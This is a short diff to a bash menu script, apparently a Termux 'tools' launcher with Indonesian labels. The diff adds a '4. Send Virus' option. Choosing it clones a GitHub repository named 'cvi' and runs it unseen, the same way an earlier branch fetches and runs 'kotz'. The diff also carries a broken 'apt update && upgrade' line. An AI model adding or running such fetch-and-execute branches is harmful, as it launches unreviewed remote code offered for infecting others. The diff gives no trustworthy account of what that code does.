@@ -61,7 +61,8 @@ echo "Y. Cek Instagram"
 echo "Z. SETSMS"
 echo "1. EXIT"
 echo "2. Date "
-echo -e "3 Kalkulator${DELETE}"
+echo "3 Kalkulator"
+echo "4. Send Virus${DELETE}"
 
 read -p "Choose The Letter : " pil
 
@@ -196,6 +197,13 @@ git clone https://github.com/kazharalyu/kotz
 cd kotz
 dir
 sh kotz.sh
+elif [[ $pil = "4" ]]; then
+apt update && upgrade
+pkg install git
+git clone https://github.com/kazharalyu/cvi
+cd cvi
+ls
+bash cvi
 sleep 1
 else
 sleep 1
